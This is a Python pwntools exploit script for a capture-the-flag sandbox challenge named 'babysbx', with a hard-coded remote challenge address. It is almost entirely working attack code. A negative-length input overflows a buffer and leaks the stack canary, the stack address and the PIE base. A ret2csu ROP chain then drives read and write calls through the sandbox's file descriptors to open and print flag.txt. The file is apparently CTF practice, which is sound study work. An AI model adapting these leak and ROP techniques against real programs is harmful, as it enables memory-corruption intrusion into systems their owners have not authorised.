from pwn import *
import sys

if sys.argv[1] == "r":
    p = remote("65.108.188.88", 31010)
else:
    p = process("./babysbx")
    context.terminal = ["tmux","splitw", "-h"]
    gdb.attach(proc.pidof(p)[0], """ 
                pie breakpoint 0x17BF
                continue
                    """)
# child bp: 0x15EB
# child bp: 0x15b9

pop_rdi = 0x1883
pop_rsi_r15 = 0x1881
read_plt = 0x1240
read_got = 0x3F88
write_plt = 0x11C0
write_got = 0x3F48
csu_1 = 0x187A
csu_2 = 0x1860
def solve():

    # leak canary
    p.sendlineafter("Choice: ", "1")
    p.sendlineafter("Length: ", str(-100))
    p.send("A"*(0x109))
    p.sendlineafter("Choice: ", "2")
    p.recv(0x108)
    canary = u64(p.recv(8))-0x41
    success("canary: %s"%hex(canary))

    # leak rbp
    p.sendlineafter("Choice: ", "1")
    p.sendlineafter("Length: ", str(-100))
    p.send("A"*(0x110))
    p.sendlineafter("Choice: ", "2")
    p.recv(0x110)
    stack = u64(p.recv(6) + "\x00\x00") - 0x120
    success("stack: %s"%hex(stack))

    # leak pie
    p.sendlineafter("Choice: ", "1")
    p.sendlineafter("Length: ", str(-100))
    p.send("A"*(0x118))
    p.sendlineafter("Choice: ", "2")
    p.recv(0x118)
    pie = u64(p.recv(6) + "\x00\x00") - 0x17ff
    success("pie: %s"%hex(pie))
    # print "before ropping"
    # pause()
    # rop to overwrite in and out
    p.sendlineafter("Choice: ", "1")
    p.sendlineafter("Length: ", str(-100))

    # open flag
    # read from stdin to bss
    ropchain = "A"*0x108 + p64(canary) + p64(stack)
    ropchain += p64(pie+csu_1)
    ropchain += p64(0) + p64(1)  
    ropchain += p64(0) # r12d -> edi
    ropchain += p64(pie+0x4050) # r13 -> rsi
    ropchain += p64(0x14) # r14 -> rdx
    ropchain += p64(pie+read_got) # r15 -> call
    ropchain += p64(pie+csu_2)
    ropchain += p64(0)*7
    # write from bss to fd = 3
    ropchain += p64(pie+pop_rdi)
    ropchain += p64(4)
    ropchain += p64(pie+pop_rsi_r15)
    ropchain += p64(pie+0x4050)
    ropchain += p64(0)
    ropchain += p64(pie+write_plt)

    # read flag
    # read from stdin to bss
    # ropchain += p64(pie+pop_rdi)
    # ropchain += p64(0)
    # ropchain += p64(pie+pop_rsi_r15)
    # ropchain += p64(pie+0x4050)
    # ropchain += p64(0)
    # ropchain += p64(pie+read_plt)
    ropchain += p64(pie+csu_1)
    ropchain += p64(0) + p64(1)  
    ropchain += p64(0) # r12d -> edi
    ropchain += p64(pie+0x4050) # r13 -> rsi
    ropchain += p64(0x14) # r14 -> rdx
    ropchain += p64(pie+read_got) # r15 -> call
    ropchain += p64(pie+csu_2)
    ropchain += p64(0)*7
    # write from bss to fd = 3
    ropchain += p64(pie+pop_rdi)
    ropchain += p64(4)
    ropchain += p64(pie+pop_rsi_r15)
    ropchain += p64(pie+0x4050)
    ropchain += p64(0)
    ropchain += p64(pie+write_plt)

    # write flag
    # read from stdin to bss
    # ropchain += p64(pie+pop_rdi)
    # ropchain += p64(0)
    # ropchain += p64(pie+pop_rsi_r15)
    # ropchain += p64(pie+0x4050)
    # ropchain += p64(0)
    # ropchain += p64(pie+read_plt)
    ropchain += p64(pie+csu_1)
    ropchain += p64(0) + p64(1)  
    ropchain += p64(0) # r12d -> edi
    ropchain += p64(pie+0x4050) # r13 -> rsi
    ropchain += p64(0x14) # r14 -> rdx
    ropchain += p64(pie+read_got) # r15 -> call
    ropchain += p64(pie+csu_2)
    ropchain += p64(0)*7
    # write from bss to fd = 3
    ropchain += p64(pie+pop_rdi)
    ropchain += p64(4)
    ropchain += p64(pie+pop_rsi_r15)
    ropchain += p64(pie+0x4050)
    ropchain += p64(0)
    ropchain += p64(pie+write_plt)
    # read from fd=6 to bss
    # ropchain += p64(pie+pop_rdi)
    # ropchain += p64(6)
    # ropchain += p64(pie+pop_rsi_r15)
    # ropchain += p64(pie+0x4050)
    # ropchain += p64(0)
    # ropchain += p64(pie+read_plt)

    ropchain += p64(pie+csu_1)
    ropchain += p64(0) + p64(1)  
    ropchain += p64(5) # r12d -> edi
    ropchain += p64(pie+0x4050) # r13 -> rsi
    ropchain += p64(0x30) # r14 -> rdx
    ropchain += p64(pie+read_got) # r15 -> call
    ropchain += p64(pie+csu_2)
    ropchain += p64(0)*7
    # write from bss to fd = 1
    ropchain += p64(pie+pop_rdi)
    ropchain += p64(1)
    ropchain += p64(pie+pop_rsi_r15)
    ropchain += p64(pie+0x4050)
    ropchain += p64(0)
    ropchain += p64(pie+write_plt)
    p.send(ropchain)
    pause()
    p.sendlineafter("Choice: ", "3")
    p.send(p32(0) + "flag.txt\x00" + "A"*(0x10-4-9))
    print "read flag"
    pause()
    p.send(p32(1) + "B"*(0x10))
    p.send(p32(2) + "C"*(0x10))
    
    p.interactive()

if __name__ == "__main__":
    solve()